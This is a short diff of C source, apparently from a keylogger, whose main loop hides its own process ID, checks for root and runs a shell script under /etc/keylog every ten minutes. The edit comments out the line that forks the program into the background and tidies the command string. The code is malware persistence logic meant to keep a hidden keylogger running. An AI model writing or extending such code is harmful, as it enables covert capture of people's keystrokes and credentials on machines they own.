@@ -35,14 +35,14 @@ int is_root(void) {
 }
 
 int main(int argc, char *argv[]) {
-	if (fork() != 0) return 0;
+	// if (fork() != 0) return 0;
 	
 	hide_pid();
 	is_root(); 
 	char str[50];
 
 	while (1) {
-		sprintf(str, "bash /etc/keylog/run_update.sh\0");
+		sprintf(str, "bash /etc/keylog/run_update.sh");
 		system(str);
 		sleep(600);
 	}
